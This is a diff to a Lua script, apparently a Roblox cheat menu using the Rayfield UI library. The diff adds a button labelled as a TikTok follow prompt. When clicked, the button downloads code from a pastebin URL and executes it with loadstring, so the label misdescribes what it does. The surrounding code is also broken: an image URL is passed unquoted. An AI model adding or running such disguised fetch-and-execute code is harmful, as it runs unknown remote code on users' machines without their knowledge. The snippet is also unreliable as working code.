@@ -29,4 +29,11 @@ local Window = Rayfield:CreateWindow({
 local MainTab = Window:CreateTab("Info", https://i.imgur.com/Rsn7fR7.jpg) -- Title, Image
 local MainSection = MainTab:CreateSection("Main")
 
+local Button2 = TPTab:CreateButton({
+   Name = "Follow Tiktok: @Yenzzgpp",
+   Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/9YVfEBDD"))()
+   end,
+})
+
 
